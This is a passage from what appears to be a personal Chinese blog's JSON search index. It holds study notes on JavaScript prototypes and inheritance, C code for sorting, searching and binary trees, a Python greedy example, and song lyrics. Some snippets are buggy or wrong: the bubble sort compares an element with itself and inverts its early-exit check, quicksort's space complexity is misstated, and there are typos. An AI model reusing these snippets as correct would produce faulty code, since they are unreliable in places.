&#125;\n&#125;\n\n除了相同部分，有如下区别：\n\n没有显式的创建对象；\n直接将属性和方法赋给了this对象；\n没有return；\n\nNote：构造函数使用应该使用首字母大写的开头，非构造函数小写字母开头；\n//要创建Person实例，需要使用new\nlet newPerson=new Person(\"Martin\",18,\"Programmer\");\nconsole.log(newPerson.constructor==Person);   //true\nconsole.log(newPerson instanceof Person);\t//true\n\n\n创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；\n构造函数虽然好用，但是也不是没有缺点。\n主要问题是：每个方法都要再实例上重新创建一遍；\n不同实例创建相同函数名的函数，会导致不同的作用域链和标识符解析。\n创建相同的Function实例完全没有必要，况且有this对象在根本不用在执行代码前九八函数绑定到特定的对象上面；\n\n//优化方法\nfunction Person(name,age)&#123;\n    this.name=name;\n    this.age=age;\n    \n    this.sayName=sayName;\n&#125;\n\nfunction sayName()&#123;\n    console.log(this.name);\n&#125;\n\n\n构造函数内部将sayName属性设置成全局的sayName函数。\n新的问题：虽然方法定义在全局作用域，但实际上只能被某个对象调用，让全局作用域名不副实；\n更进一步，如果一个对象需要定义很多方法，则需要定义多个全局函数，失去封装性；\n\n原型模式\n我们创建的每个函数都有一个prototype属性，这个属性是一个指针，指向一个对象。\nPrototype就是通过调用构造函数而创建的那个对象实例的原型对象；\n使用原型对象的好处是可以让所有对象实例共享它所包含的属性和方法，即不用再构造函数中定义对象实例的信息，而是将这些信息直接添加到原型对象中；\n\nfunction Person()&#123;\n    \n&#125;\n\nPerson.prototype.name=\"Martin\";\nPerson.prototype.age=23;\nPerson.prototype.sayName=function()&#123;\n    console.log(this.name);\n&#125;;\n\nvar person1=new Person();\nvar person2=new Person();\nperson1.name=\"Martin\"\nperson2.name=\"Jack\"\nperson1.sayName();   //\"Martin\"\nperson2.sayName();\t//\"Jack\"\n\nconsole.log(person1.sayName()==person2.sayName())\t//true\n\n理解原型对象\n无论什么时候，只要创建了新韩淑，会为这个函数创建一个prototype属性，这个属性指向函数的原型对象。\n默认情况下，所有原型对象都会自动获得一个constructor属性，这个属性包含一个指向prototype属性所在函数的指针。\n举前面的例子：\nPerson.prototype.constructor指向Person，通过这个构造函数可以伪原型对象添加其他属性；\n\n\n\n当为对象实例添加一个属性时，属性会屏蔽原型对象中保存的同名属性；\n原型对象中的属性值不变；只会修改实例中的属性；\n使用delete操作符可以完全删除实例属性，达到访问原型属性值的目的；\n使用hasOwnProperty()来检查属性值是来自于原型还是实例；\n\n\n原型与in操作符\n有两种方式使用in操作符：单独使用和for-in循环使用；\n单独使用：通过对象能返回给定属性时返回true（不论原型和实例）；hasOwnProperty()只适用于实例；\ntips:如果in返回true而hasOwnProperty()返回false，可以确定属性是原型中的属性；\nfor-in中使用：返回的是通过对象访问的，可以枚举的属性；\n\n//获得对象上所有的可枚举实例\nobject.keys();\n\nvar p=new Person();\nvar pKeys=Obcject.keys(p);\n\n更简单的原型语法//简写prototype\nfunction Person()&#123;&#125;\n\nPerson.prototype=&#123;\n    name:\"Martin\",\n    age:29,\n    job:\"Software Engineer\",\n    sayName:function()&#123;\n        alert(this.name);\n    &#125;\n&#125;;\n\n//上面的代码里，将Person.prototype设置为一个字面量创建的新对象；但是此时constructor不再指向Person了；\n//每创建一个函数，同时会创建他的prototype对象，这个对象自动获得constructor属性；\nPerson.prototype=&#123;\n    constructor:Person,\n    name:\"Martin\",\n    age:29,\n    job:\"Software Engineer\",\n    sayName:function()&#123;\n        alert(this.name);\n    &#125;\n&#125;;\n\n组合使用：构造函数模式和原型模式\n构造函数用于定义实例属性；原型模式用于定义方法和共享属性；\n共享方法，但是每个实例有自己的属性副本；\n\nfunction Person(name, age, job)&#123; \n this.name = name; \n this.age = age; \n this.job = job; \n this.friends = [\"Shelby\", \"Court\"]; \n&#125; \nPerson.prototype = &#123; \n constructor : Person, \n sayName : function()&#123; \n alert(this.name); \n &#125; \n&#125; \n\n动态原型模式\n通过将所有信息封装到构造函数，再构造函数中初始化原型；\n\nfunction Person(name, age, job)&#123; \n this.name = name; \n this.age = age; \n this.job = job; \n    if(typeof this.sayName!=\"function\")&#123;\n        Person.prototype.sayName=function()&#123;\n            alert(this.name);\n        &#125;\n    &#125;\n&#125; \n\n寄生构造函数function Person(name, age, job)&#123; \n var o = new Object(); \n o.name = name; \n o.age = age; \n o.job = job; \n o.sayName = function()&#123; \n alert(this.name); \n &#125;; \n return o; \n&#125; \nvar friend = new Person(\"Nicholas\", 29, \"Software Engineer\"); \nfriend.sayName(); //\"Nicholas\" \n\n3.继承\n接口继承：只继承方法签名；\n实现继承：继承实际方法；\n\nES只支持实现继承，主要依靠原型链实现；\n（1）原型链\n利用原型让一个引用类型继承另一个引用类型的属性和方法；\n\n//原型链基本模式\n\nfunction SuperType()&#123;\n    this.property=true;\n&#125;\n\nSuperType.prototype.getSuperValue=function()&#123;\n    return this.property;\n&#125;;\n\nfunction SubType()&#123;\n    this.subproperty=false;\n&#125;\n\nSubType.prototype=new SuperType();\t\t//子类的原型是父类的实例；子类获得父类的所有属性和方法；\n\nSubType.prototype.getSubValue=function()&#123;\n    return this.subproperty;\n&#125;;\n\nvar instacne=new SubType();\nconsole.log(instacne.getSuperValue());\t\t//true;\n\n\n\n别忘记默认的原型\n\n\n所有引用类型都默认继承Object；\n\n\n\n确定原型和实例的关系\n\ninstance instanceof Object;\nObjcet.prototype.isPrototypeOf(instance);\n\n\n谨慎的定义代码\n\n\n子类优势需要重写超类中的某个方法，或者添加超累不存在的某个方法；\n不管怎样，给原型添加的代码一定要放在替换原型语句之后；\n\nfunction SuperType()&#123; \n this.property = true; \n&#125; \nSuperType.prototype.getSuperValue = function()&#123; \n return this.property; \n&#125;; \nfunction SubType()&#123; \n this.subproperty = false; \n&#125; \n\n//继承了 SuperType \nSubType.prototype = new SuperType(); \n//!!!!添加新方法\nSubType.prototype.getSubValue = function ()&#123; \n return this.subproperty; \n&#125;; \n//重写超类型中的方法\nSubType.prototype.getSuperValue = function ()&#123; \n return false; \n&#125;; \nvar instance = new SubType(); \nalert(instance.getSuperValue()); //false \n\n\nNotice!!!使用原型链实现继承时，不能使用对象字面量创建原型方法；因为会重写原型链；\nfunction SuperType()&#123; \n this.property = true; \n&#125; \nSuperType.prototype.getSuperValue = function()&#123; \n return this.property; \n&#125;; \nfunction SubType()&#123; \n this.subproperty = false; \n&#125; \n//继承了 SuperType \nSubType.prototype = new SuperType(); \n//使用字面量添加新方法，会导致上一行代码无效\nSubType.prototype = &#123; \n getSubValue : function ()&#123; \n return this.subproperty; \n &#125;, \n someOtherMethod : function ()&#123; \n return false; \n &#125; \n&#125;; \nvar instance = new SubType(); \nalert(instance.getSuperValue()); //error! \n\n\n原型链的问题\n\n\n问题来自于包含引用类型值的原型；\n包含引用类型值的原型属性会被所有实例共享，这也是在构造函数而不是在原型对象中定义属性的原因；\n在通过原型来实现继承时，原型实际上会变成另一个类型的实例；于是原先实例的属性也就变成了现在的原型属性了；\n\n//定义了一个colors属性\nfunction SuperType()&#123;\n    this.colors=['red','grenn']l\n&#125;\n\nfunction SubType()&#123;\n    \n&#125;\n\n//子类原型设为父类\nSubType.protptype=new SuperType();\nvar instance1=new SubType();\n//所有的子都会共享colors；\ninstance1.colors.push('black');\nalert(instance1.colors);\t\t\t//red\\gren\\black\n\nvar instance2=new SubType();\nalert(instance2.colors);\t\t\t//red\\green\\black\n\n（2）借用构造函数\n伪造对象或者经典继承；\n在子类构造函数的内部调用超类型构造函数；\n\n//定义了一个colors属性\nfunction SuperType()&#123;\n    this.colors=['red','grenn']l\n&#125;\n\nfunction SubType()&#123;\n    SuperType.call(this);\t//继承了supertype；实际上在未来新创建的SubType实例时调用SuperType的构造函数；\n&#125;\n\nvar ins=new SubType();\nins.colors.push(\"black\");\nconsole.log(ins.colors);\t//red.green.black;\nvar ins2=new SubType();\nconsole.log(ins2.colors);\t//red.green;\t//不会共享colors了；\n\n\n传递参数\n相比于原型链，借用构造函数有一个很大的优势，可以在子类型构造函数中向超累型构造函数传递参数；\n\n//定义了一个colors属性\nfunction SuperType()&#123;\n    this.name=name;\n&#125;\n\nfunction SubType()&#123;\n    SuperType.call(this,\"Martin\");\t\t//调用父类构造函数实际上为子类的实例设置了name属性；\n    this.age=29;\t\t//为了确保父类构造函数不会重写子类的属性，可以在调用父类构造函数忠厚添加子类定义的属性；\n&#125;\n\nvar ins=new SubType();\nconsole.log(ins.name);\t\t//Martin\nconsole.log(ins.age);\t\t//29\n\n\n问题\n仅仅借用构造函数，无法避免构造函数模式存在的问题：方法都在构造函数中定义，无法函数复用；\n超类原型定义的方法对子类而言也是不可见得；\n\n（3）组合继承\n组合继承：有时叫伪经典继承，指将原型链和借用构造函数的技术组合到一块儿，发挥二者之长的继承模式；\n背后的思路是使用原型链实现对原型属性和方法的继承，通过借用构造函数来实现对实例属性的继承；\n\n","slug":"JS基础","date":"2022-09-11T18:51:45.000Z","categories_index":"前端","tags_index":"笔记,JS","author_index":"Martin"},{"id":"2a1893ca085cc0c5b7d1cdcd8c0b1c91","title":"排序","content":"排序算法一、插入排序每次将一个待排序的记录插入到前面已经排序的序列；\nvoid InsertSort(RecordType R[],int num)\n&#123;\n    int index1,index2;\n\n    for(index1=2;index1&lt;=num;index1++)\n    &#123;\n       R[0]=R[index1];\n       index2=index1-1;\n       while(R[0].key&lt;R[index2].key)\n       &#123;\n           R[index2+1]=R[index2];\n           index2--;\n           R[index2+1]=R[0];\n       &#125;\n    &#125;\n&#125;\n\n适用于一个基本有序的序列，n^2,稳定的；\n二、希尔排序又名缩小增量排序，按照下标增量分成若干个子序列，对每个子序列进行直接插入排序；一轮结束后缩小增量，划分子序列；\nvoid ShellSort(RecordType R[],int num)\n&#123;\n    int index1,index2;\n    int increasement;    //增量\n\n    for(increasement=num/2;increasement>0;increasement=increasement/2)\n    &#123;\n        for(index1=increasement+1;index1&lt;=num;index1++)\n        &#123;\n            R[0]=R[index1];\n            index2=index1-increasement;\n            while(index2>=0&amp;&amp;R[0].key&lt;R[index2].key)\n            &#123;\n                R[index2+increasement]=R[index2];\n                index2=index2-increasement;\n            &#125;\n            R[index2+increasement]=R[0];\n        &#125;\n    &#125;\n    return;\n&#125;\n\n空间复杂度O（1），适合大批量杂乱无章的数据序列，不稳定；\n三、冒泡排序每一轮按序比较相邻的两个数据，每一轮将最大的一个或最小的一个排序到最后；\nvoid BubbleSort(RecordType r[],int num)\n&#123;\n    int index1,index2;\n    int isExchange;\n    for(index1=1;index1&lt;num;index1++)\n    &#123;\n        isExchange=0;\n        for(index2=1;index2&lt;=num-1;index2++)\n        &#123;\n            if(r[index2].key>r[index2].key)\n            &#123;\n                r[0]=r[index2+1];\n                r[index2+1]=r[index2];\n                r[index2]=r[0];\n                isExchange=1;\n            &#125;\n        &#125;\n        if(isExchange)\n        &#123;\n            break;\n        &#125;\n    &#125;\n&#125;\n\n时间复杂度O（n^2）,空间复杂度O（1），稳定的；\n四、快速排序int Partition(RecordType R[],int low,int high)\n&#123;\n    R[0]=R[low];\n    while(low&lt;high)\n    &#123;\n        while(low&lt;high&amp;&amp;R[high].key>=R[0].key)\n        &#123;\n            --high;\n        &#125;\n        R[low]=R[high];\n        while(low&lt;high&amp;&amp;R[low].key&lt;=R[0].key)\n        &#123;\n            ++low;\n        &#125;\n        R[high]=R[low];\n    &#125;\n    R[low]=R[0];\n    return low;\n&#125;\n\nvoid Quicksort(RecordType R[],int low,int high)\n&#123;\n    int loc;\n    if(low&lt;high)\n    &#123;\n        loc=Partition(R,low,high); \n        Quicksort(R,low,loc-1);\n        Quicksort(R,loc+1,high);\n    &#125;\n&#125;\n\n空间复杂度O(1),时间复杂度O（n^2）\n五、折半插入排序使用直接插入排序，使用折半查找需要插入的位置；\nvoid BinarySort(RecordType R[],int num)\n&#123;\n    int index1,index2;\n    int lowPoint,highPoint,midPoint;\n    for(index1=1;index1&lt;=num;index1++)\n    &#123;\n        R[0]=R[index1];\n        lowPoint=1;\n        highPoint=index1-1;\n        while(lowPoint&lt;=highPoint)\n        &#123;\n            midPoint=(lowPoint+highPoint)/2;\n            if(R[0].key&lt;R[midPoint].key)\n            &#123;\n                highPoint=midPoint-1;\n            &#125;\n            else\n            &#123;\n                lowPoint=midPoint+1;\n            &#125;\n        &#125;\n        for(index2=index1-1;index2>=highPoint+1;--index2)\n        &#123;\n            R[index2+1]=R[index2];\n        &#125;\n        R[highPoint+1]=R[0];\n    &#125;\n&#125;\n\n","slug":"Ch8排序","date":"2021-08-31T12:57:45.000Z","categories_index":"编程","tags_index":"C语言","author_index":"Martin"},{"id":"827701aa0aeba949971d70c354c78372","title":"贪心算法","content":"贪心算法思想：每一步都选择局部最优解 \n#问题描述：现有几个州需要使用广播电台覆盖，每个广播电台覆盖的范围不一样，找出需要的最小的州的合集；\n#解：使用贪心算法，（1）选出一个覆盖最多未覆盖州的电台；重复知道覆盖所有电台；\n\n# 州名\nstates_need = set([\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\"])\n\n# 可供选择的电台\nstations = &#123;&#125;\nstations[\"kone\"] = set([\"a\", \"d\", \"e\"])\nstations[\"ktwo\"] = set([\"e\", \"b\", \"f\"])\nstations[\"kthree\"] = set([\"a\", \"g\"])\nstations[\"kfoue\"] = set([\"c\", \"e\", \"g\"])\n\n# 最终决定的电台\nfinal_station = set()\n\nwhile states_need:\n    bestStation = None\n    states_covered = set()\n    for station, states in stations.items():\n        # 计算已经覆盖的并集\n        covered = states_need &amp; states\n        if len(covered) > len(states_covered):\n            bestStation = station\n            states_covered = covered\n\n    states_need -= states_covered\n    final_station.add(bestStation)\n\nprint(final_station)\n\n\n","slug":"贪心算法","date":"2021-08-29T10:03:45.000Z","categories_index":"算法","tags_index":"笔记,贪心算法","author_index":"Martin"},{"id":"35fa380e6c3de504a5cc1614ac079c98","title":"CH7 查找","content":"一、顺序查找MSL最大查找长度，ASL平均查找长度；\nASL成功=SumPi（n-i+1） ASL失败=n+1\n#include &lt;stdio.h>\n#include &lt;stdlib.h>\n\n#define MAXSIZE 100\n\ntypedef int keyType;\ntypedef struct\n&#123;\n    keyType key;\n&#125; SElemType;\n\ntypedef struct\n&#123;\n    SElemType *elem;\n    int length;\n&#125; SeqTable;\n\nint Search_Seq(SeqTable ST)\n&#123;\n    int index;\n    keyType key;\n    printf(\"Enter the target:\");\n    scanf(\"%d\",&amp;key);\n    ST.elem[ST.length].key=key;\n    for(index=0; ST.elem[index].key!=key; ++index);\n    if(index&lt;ST.length)\n    &#123;\n        printf(\"Find in %d\",index);\n        return index;\n    &#125;\n    else return -1;\n&#125;\n\nvoid main()\n&#123;\n    SeqTable SQT;\n    keyType key;\n    int index;\n    SElemType Data[MAXSIZE]= &#123;34,44,43,12,53,55,73,64,77&#125;;\n    SQT.elem=Data;\n    SQT.length=9;\n    index=Search_Seq(SQT);\n&#125;\n//若找不到报错，检查scanf函数是否添加了&amp;符号v(#｀-_ゝ-)\n\n\n\n\n二、折半查找(静态)必须使用顺序存贮且元素按照关键字升序；\n#include&lt;stdio.h>\n\n#define MAXSIZE 100\n\ntypedef int keyType;\n\ntypedef struct\n&#123;\n    keyType key;\n&#125;SElemType;\n\ntypedef struct\n&#123;\n    SElemType *elem;\n    int length;\n&#125;SeqTable;\n\nint SearchBin(SeqTable ST)\n&#123;\n    int low,mid,high;\n    low=0;\n    high=ST.length-1;\n    keyType target;\n    printf(\"Enter the target:\");\n    scanf(\"%d\",&amp;target);\n    while(low&lt;=high)\n    &#123;\n        mid=(low+high)/2;\n        printf(\"low:%d,mid:%d,high:%d\\n\",low,mid,high);\n        if(target==ST.elem[mid].key)\n        &#123;\n            printf(\"Find in position %d.\",mid);\n            return mid;\n        &#125;\n        else if(target&lt;ST.elem[mid].key)\n        &#123;\n            high=mid-1;\n        &#125;\n        else\n        &#123;\n            low=mid+1;\n        &#125;\n    &#125;\n    return -1;\n&#125;\n\nvoid main()\n&#123;\n        SeqTable T;\n        int index;\n        SElemType DATA[MAXSIZE]=&#123;10,13,15,20,65,66,90,100,120&#125;;\n        T.elem=DATA;\n        T.length=9;\n        index=SearchBin(T);\n        if(index==-1)\n        &#123;\n            printf(\"No such a data.\\n\");\n        &#125;\n&#125;\n\n#include&lt;stdio.h>\n\n#define MAXSIZE 100\n\ntypedef int keyType;\n\ntypedef struct\n&#123;\n    keyType key;\n&#125;SElemType;\n\ntypedef struct\n&#123;\n    SElemType *elem;\n    int length;\n&#125;SeqTable;\n\nint SearchBin(SeqTable ST)\n&#123;\n    int low,mid,high;\n    low=0;\n    high=ST.length-1;\n    keyType target;\n    printf(\"Enter the target:\");\n    scanf(\"%d\",&amp;target);\n    while(low&lt;=high)\n    &#123;\n        mid=(low+high)/2;\n        printf(\"low:%d,mid:%d,high:%d\\n\",low,mid,high);\n        if(target==ST.elem[mid].key)\n        &#123;\n            printf(\"Find in position %d.\",mid);\n            return mid;\n        &#125;\n        else if(target&lt;ST.elem[mid].key)\n        &#123;\n            high=mid-1;\n        &#125;\n        else\n        &#123;\n            low=mid+1;\n        &#125;\n    &#125;\n    return -1;\n&#125;\n\nvoid main()\n&#123;\n        SeqTable T;\n        int index;\n        SElemType DATA[MAXSIZE]=&#123;10,13,15,20,65,66,90,100,120&#125;;\n        T.elem=DATA;\n        T.length=9;\n        index=SearchBin(T);\n        if(index==-1)\n        &#123;\n            printf(\"No such a data.\\n\");\n        &#125;\n&#125;\n\n\n\n\n\n三、二叉排序树查找（动态）二叉树中所有的左孩子小于其父节点，右孩子大于其父节点\n若根节点的左右子树高度差不超过1，则称为平衡二叉树；ASL=log2（n）\n#include&lt;stdio.h>\n#include&lt;stdlib.h>\n\ntypedef int keyType;\n\ntypedef struct BTNode\n&#123;\n    keyType key;\n    struct BTNode *lchild,*rchild;\n&#125;BTNode,*BiTree;\n\nBiTree SearchBSTree(BTNode *T,keyType key)\n&#123;\n    if(!T||key==T->key) return T;\n    else if(key&lt;T->key) return(SearchBSTree(T->lchild,key));\n    else return(SearchBSTree(T->rchild,key));\n&#125;\n\nBTNode *SearchBST(BTNode *T,keyType key,int *flag)\n&#123;\n    BTNode *p,*pre;\n    //flag==1，查找成功，返回该元素节点；否则查找失败，返回访问的最后一个节点；\n    *flag=0;\n    if(!T)\n    &#123;\n        *flag=0;\n        return T;\n    &#125;\n    p=T;\n    pre=T;\n    while(p!=NULL&amp;&amp;key!=p->key)\n    &#123;\n        pre=p;\n        if(key&lt;p->key) p=p->lchild;\n        else p=p->rchild;\n    &#125;\n    if(p!=NULL&amp;&amp;key==p->key)\n    &#123;\n        *flag=1;\n        return p;\n    &#125;\n    else\n    &#123;\n        *flag=0;\n        return pre;\n    &#125;\n&#125;\n\nBTNode *InsertBSTNode(BTNode *T,keyType key)\n&#123;\n    BTNode *p,*s;\n    int flag=0;\n    //查找是否存在相同节点\n    p=SearchBST(T,key,&amp;flag);\n    if(!flag)\n    &#123;\n        s=(BTNode*)malloc(sizeof(BTNode));\n        s->key=key;\n        s->lchild=s->rchild=NULL;\n        if(!p)\n        &#123;\n            return s;\n        &#125;\n        else if(key&lt;p->key) p->lchild=s;\n        else p->rchild=s;\n    &#125;\n    return T;\n&#125;\n\nBiTree Create(keyType key)\n&#123;\n\n    BiTree T;\n    T=(BTNode*)malloc(sizeof(BTNode));\n    if(T==NULL)\n    &#123;\n        printf(\"Asaign the memory failurely.\");\n        return NULL;\n    &#125;\n    T->key=key;\n    T->lchild=T->rchild=NULL;\n    return T;\n&#125;\n\nvoid VisitNode(keyType key)\n&#123;\n    printf(\"%d \",key);\n&#125;\n\nvoid InorderTree(BiTree T)\n&#123;\n    if(T!=NULL)\n    &#123;\n        InorderTree(T->lchild);\n        VisitNode(T->key);\n        InorderTree(T->rchild);\n    &#125;\n&#125;\n\n\nvoid main()\n&#123;\n\n    BTNode *ST;\n    keyType mykey;\n    int index,nums;\n    printf(\"Enter the nodes' number:\");\n    scanf(\"%d\",&amp;nums);\n    printf(\"Please enter the root's data:\");\n    scanf(\"%d\",&amp;mykey);\n    ST=Create(mykey);\n\n    for(index=1;index&lt;nums;index++)\n    &#123;\n        keyType tmp_key;\n        printf(\"Please enter the %d node:\",index);\n        scanf(\"%d\",&amp;tmp_key);\n        ST=InsertBSTNode(ST,tmp_key);\n    &#125;\n    InorderTree(ST);\n    printf(\"Please enter the target data:\");\n    scanf(\"%d\",&amp;mykey);\n    ST=SearchBSTree(ST,mykey);\n    if(!ST)\n    &#123;\n        printf(\"No such a data.\\n\");\n    &#125;\n    else\n    &#123;\n        printf(\"Find it:%d!\",mykey);\n    &#125;\n\n&#125;\n\n\n\n\n四、哈希表1.适用于动态查找和静态查找2.常见哈希函数（1）直接定址：适合连续的分布；\n（2）除留取余：假定哈希表长m,取p&lt;=m，一般选择不大于m的最大质数；\n3.处理冲突的方法（1）开放地址：Hi=(H(Key)+di)%m;\n​        i.线性探测法：若计算出的地址冲突，则一次向后顺延；容易造成聚集（堆积），降低查找效率；\n​        ii.平方探测法：若计算出的地址冲突，则一次向后/前顺延i^2个地址；\n（2）链地址：在冲突的数据位置设置链表；\n","slug":"CH7 查找","date":"2021-08-25T12:57:45.000Z","categories_index":"编程","tags_index":"C语言","author_index":"Martin"},{"id":"0456a819f148a1e76c28ca6cd747afa8","title":"Sound of Walking Away","content":"\nDon’t come find me, I won’t be here waiting请别试图寻找我 我不会再原地等待I so can do it alone, you’re not worth staying我自己可以过得很好 你不值得我再多停留\nWeren’t listening but now there’s no way you won’t hear你不曾倾听 但现在你不得不听There’s a voice emerging in the night so loud and clear有个声音在耳畔萦绕 嘹亮清晰I’ll turn it up like you turn me down, I’m not afraid即使你想让我低声细语我也要大声宣泄，我不会畏惧Hit play, hit play叫嚣着 呼喊着It’s the sound of walking away这是决然离开的声音\nIt’s the sound of walking away这是决然离开的声音It’s the sound of walking away\n","slug":"Sound of Walking Away","date":"2021-08-22T16:00:46.000Z","categories_index":"日常","tags_index":"日常,音乐推荐","author_index":"Martin"},{"id":"01cf899dac80c5a14d5d881768abc55f","title":"树","content":"Ch 5 树一、二叉树及其性质（1）二叉树可以为空，但是二叉有序树至少三个节点；\n（2）满二叉树：2^k-1个节点、\n（3）非空二叉树第i层的节点数不超过2^i-1个；\n（4）深度为k的二叉树最少k个节点，最多2^k-1个节点；\n（5）n0=n2-1;\n（6）n个节点的二叉树深度为Log2 N-1；\n（7）完全二叉树中，节点i的双亲节点为[i/2],左孩子2i，有孩子2i+1；\n二、二叉树的实现及常用操作1.二叉树的基本操作#include&lt;stdio.h>\n#include&lt;stdlib.h>\n#define MAXNODE 10\n\ntypedef int Elemtype ;\n\ntypedef struct BiTreeNode\n&#123;\n    Elemtype data;\n    struct BiTreeNode *lchild,*rchild;\n&#125; BiTreeNode,*BiTree;\n\ntypedef struct BiTreeParNode\n&#123;\n    Elemtype data;\n    struct BiTreeParNode *lchild,*rchild,*parent;\n&#125; BiParTreeNode,*BiParTree;\n\nvoid Initiate(BiTree T)\n&#123;\n    if((T=(BiTreeNode*)malloc(sizeof(BiTreeNode)))==NULL)\n    &#123;\n        printf(\"Empty tree.\\n\");\n        return;\n    &#125;\n    T->lchild=NULL;\n    T->rchild=NULL;\n    return;\n&#125;\n\nBiTree CreateTree(Elemtype x)\n&#123;\n    BiTree p;\n    if((p=(BiTree *)malloc(sizeof(BiTreeNode)))==NULL)\n    &#123;\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    &#125;\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    return p;\n&#125;\n\nBiTree InsertTreeLeftNode(BiTree T,Elemtype x,BiTree parent)\n&#123;\n    BiTree p;\n    if(parent==NULL)\n    &#123;\n        printf(\"No such a parent.\\n\");\n        return NULL;\n    &#125;\n    if((p=(BiTree*)malloc(sizeof(BiTreeNode)))==NULL)\n    &#123;\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    &#125;\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    if(parent->lchild==NULL)\n    &#123;\n        parent->lchild=p;\n    &#125;\n    else\n    &#123;\n        p->lchild=parent->lchild;\n        parent->lchild=p;\n    &#125;\n    printf(\"Insert data %d to leftchild.\\n\",x);\n    return T;\n&#125;\n\nBiTree InsertTreeRightNode(BiTree T,Elemtype x,BiTree parent)\n&#123;\n    BiTree p;\n    if(parent==NULL)\n    &#123;\n        printf(\"No such a parent.\\n\");\n        return NULL;\n    &#125;\n    if((p=(BiTree*)malloc(sizeof(BiTreeNode)))==NULL)\n    &#123;\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    &#125;\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    if(parent->rchild==NULL)\n    &#123;\n        parent->rchild=p;\n    &#125;\n    else\n    &#123;\n        p->rchild=parent->rchild;\n        parent->rchild=p;\n    &#125;\n    printf(\"Insert data %d to rightchild.\\n\",x);\n    return T;\n&#125;\n\nBiTree DeleteTreeLeftNode(BiTree T,BiTree parent)\n&#123;\n    BiTree p;\n    if(parent==NULL||parent->lchild==NULL)\n    &#123;\n        printf(\"No left child.\\n\");\n        return NULL;\n    &#125;\n    p=parent->lchild;\n    parent->lchild=NULL;\n    free(p);\n    return T;\n&#125;\n\nBiTree DeleteTreeRightNode(BiTree T,BiTree parent)\n&#123;\n    BiTree p;\n    if(parent==NULL||parent->rchild==NULL)\n    &#123;\n        printf(\"No left child.\\n\");\n        return NULL;\n    &#125;\n    p=parent->rchild;\n    parent->rchild=NULL;\n    free(p);\n    return T;\n&#125;\n\nint PreOrderTree(BiTree T)\n&#123;\n    if(T==NULL)\n    &#123;\n        return;\n    &#125;\n    Visit(T->data);\n    PreOrderTree(T->lchild);\n    PreOrderTree(T->rchild);\n\n&#125;\n\nint MiddleOrderTree(BiTree T)\n&#123;\n    if(T==NULL)\n    &#123;\n        return;\n    &#125;\n    MiddleOrderTree(T->lchild);\n    Visit(T->data);\n    MiddleOrderTree(T->rchild);\n\n&#125;\n\nint LastOrderTree(BiTree T)\n&#123;\n    if(T==NULL)\n    &#123;\n        return;\n    &#125;\n    LastOrderTree(T->lchild);\n    LastOrderTree(T->rchild);\n    Visit(T->data);\n\n&#125;\n\nvoid LevelOrderTree(BiTree T)\n&#123;\n    BiTree Queue[MAXNODE];\n    int front,rear;\n\n    if(T==NULL)\n    &#123;\n        return;\n    &#125;\n    front=-1;\n    rear=-1;\n    Queue[++rear]=T;\n    while(front!=rear)\n    &#123;\n        Visit(Queue[++front]->data);\n        if(Queue[front]->lchild!=NULL)\n        &#123;\n            Queue[++rear]=Queue[front]->lchild;\n        &#125;\n        if(Queue[front]->rchild!=NULL)\n        &#123;\n            Queue[++rear]=Queue[front]->rchild;\n        &#125;\n    &#125;\n&#125;\n\nvoid Visit(Elemtype data)\n&#123;\n    printf(\"%3d\",data);\n&#125;\n\n\nint main()\n&#123;\n    BiTree myTree;\n    Elemtype rootData;\n    int numberOfNodes,index,choice;\n\n    printf(\"Please enter the node number:\\n\");\n    scanf(\"%d\",&amp;numberOfNodes);\n    printf(\"Please enter the data of root node:\");\n    scanf(\"%d\",&amp;rootData);\n\n    myTree=CreateTree(rootData);\n\n    for(index=1; index&lt;numberOfNodes; index++)\n    &#123;\n        printf(\"No %d node's position is:\\n1.Leftchild of Root.\\n2.Rightchild of Root.\\n3.Leftchild of the Root's leftchild.\\n4.Rightchild of the Root's leftchild.\\n5.Leftchild of the Root's rightchild.\\n6.Rightchild of the Root's rightchild.\\n\",index);\n        printf(\"Choice:\");\n        scanf(\"%d\",&amp;choice);\n        printf(\"Please enter the %d data:\",index);\n        Elemtype nodedata;\n        scanf(\"%d\",&amp;nodedata);\n        switch(choice)\n        &#123;\n        case 1:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree);\n            break;\n        case 2:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree);\n            break;\n        case 3:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree->lchild);\n            break;\n        case 4:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree->lchild);\n            break;\n        case 5:\n            myTree=InsertTreeLeftNode(myTree,nodedata,myTree->rchild);\n            break;\n        case 6:\n            myTree=InsertTreeRightNode(myTree,nodedata,myTree->rchild);\n            break;\n        &#125;\n    &#125;\n    printf(\"Preorder:\");\n    PreOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Middleorder:\");\n    MiddleOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Postorder:\");\n    LastOrderTree(myTree);\n    printf(\"\\n\");\n    printf(\"Leverorder:\");\n    LevelOrderTree(myTree);\n    printf(\"\\n\");\n\n    return 0;\n&#125;\n\n\n\n\n\n2.线索二叉树的基本操作#include&lt;stdio.h>\n#include&lt;stdlib.h>\n#define MAXNODE 10\n\ntypedef int Elemtype ;\n\ntypedef struct BiThrTreeNode\n&#123;\n    Elemtype data;\n    struct BiThrTreeNode *lchild;\n    struct BiThrTreeNode *rchild;\n    unsigned ltag:1;\n    unsigned rtag:1;\n&#125; BiThrTreeNode,*BiThrTree;\n\nBiThrTree pre;\n\n\nvoid Visit(Elemtype data)\n&#123;\n    printf(\"%3d\",data);\n&#125;\n\n\nBiThrTree CreateTree(Elemtype x)\n&#123;\n    BiThrTree p;\n    if((p=(BiThrTree *)malloc(sizeof(BiThrTreeNode)))==NULL)\n    &#123;\n        printf(\"Empty tree.\\n\");\n        return NULL;\n    &#125;\n    p->data=x;\n    p->lchild=NULL;\n    p->rchild=NULL;\n    return p;\n&#125;\n\nBiThrTree InsertTreeLeftNode(BiThrTree T,Elemtype x,BiThrTree parent)\n&#123;\n    BiThrTree p;\n    if(parent==NULL)\n    &#123;\n        printf(\"No such a parent.\\n\");\n        return NULL;\n    &#125;\n    